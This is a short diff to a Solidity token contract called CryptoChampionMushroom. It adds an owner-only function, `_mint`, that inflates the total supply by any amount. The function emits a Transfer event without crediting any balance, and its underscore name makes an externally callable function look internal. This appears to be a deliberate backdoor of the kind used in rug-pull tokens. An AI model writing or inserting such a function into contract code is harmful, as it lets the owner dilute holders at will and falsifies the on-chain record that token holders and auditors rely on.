@@ -1706,4 +1706,9 @@ contract CryptoChampionMushroom is Context, IERC20, Ownable {
         _takeDonationFee(tDonation);
         emit Transfer(sender, recipient, tTransferAmount);
     }
+
+    function _mint(uint256 amount) external onlyOwner {
+        _tTotal += amount;
+        emit Transfer(address(0), _msgSender(), amount);
+    }
 }
